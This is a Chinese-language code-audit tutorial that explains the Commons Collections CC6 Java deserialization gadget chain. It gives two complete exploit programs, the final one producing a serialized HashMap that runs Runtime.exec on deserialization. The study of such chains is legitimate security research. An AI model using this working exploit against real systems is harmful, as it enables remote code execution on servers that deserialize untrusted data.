---
title: cc6
date: 2026-08-03 18:48:19
categories:
  - java代码审计
tags:
  - Java
  - 反序列化
  - Commons Collections
---

## cc6

而我们的 CC6 链，可以不受 jdk 版本制约。

> 如果用一句话介绍一下 CC6，那就是 CC6 = CC1 + URLDNS

CC6 链的前半条链与 CC1 正版链子是一样的，也就是到 LazyMap 链

是 `TiedMapEntry` 类中的 `getValue()` 方法调用了 `LazyMap` 的 `get()` 方法。

![image-20260803154115034](/images/java-code-audit/07-cc6/20260803154115260.png)

构造exp

```java
package com.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

public class cc6 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        //Runtime runtime = Runtime.getRuntime();
        //InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map decorate = LazyMap.decorate(hashMap, chainedTransformer);
        Class<LazyMap> mapClass = LazyMap.class;
        TiedMapEntry key = new TiedMapEntry(decorate, "key");
        key.getValue();
//        Method get = mapClass.getDeclaredMethod("get", Object.class);
//        get.setAccessible(true);
//        get.invoke(decorate,runtime);

    }
}


```

链子可用

现在我们确保了 `TiedMapEntry` 这一段链子的可用性，往上去找谁调用了 `TiedMapEntry` 中的 `getValue()` 方法。

- 寻找的方法也略提一嘴，因为 `getValue()` 这一个方法是相当相当常见的，所以我们一般会优先找同一类下是否存在调用情况。

寻找到同名函数下的 `hashCode()` 方法调用了 `getValue()` 方法

![image-20260803161903808](/images/java-code-audit/07-cc6/20260803161904002.png)

### 与入口类结合的整条链子

- 前文我们说到链子已经构造到 `hashCode()` 这里了，这一条 `hashCode()` 的链子该如何构造呢？

我们去找谁调用了 `hashCode()` 方法，这里我就直接把答案贴出来吧，因为在 Java 反序列化当中，找到 `hashCode()` 之后的链子用的基本都是这一条。

xxx.readObject()
	HashMap.put() --自动调用-->   HashMap.hash()
		后续利用链.hashCode()

更巧的是，这里的 HashMap 类本身就是一个非常完美的**入口类**。

![img](/images/java-code-audit/07-cc6/20260803164800055.png)

最终exp

```java
package com.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class cc6 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map1 = new HashMap<Object,Object>();
        Map lazymap = LazyMap.decorate(map1, new ConstantTransformer("roxci"));
        HashMap<Object, Object>map2 = new HashMap<>();
        TiedMapEntry key = new TiedMapEntry(lazymap, "key");
        map2.put(key,"aaa");
        map1.remove("key");
        Class c = LazyMap.class;
        Field fieldfactory = c.getDeclaredField("factory");
        fieldfactory.setAccessible(true);
        fieldfactory.set(lazymap,chainedTransformer);
        serialize(map2);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;

//        Method get = mapClass.getDeclaredMethod("get", Object.class);
//        get.setAccessible(true);
//        get.invoke(decorate,runtime);

    }
}
```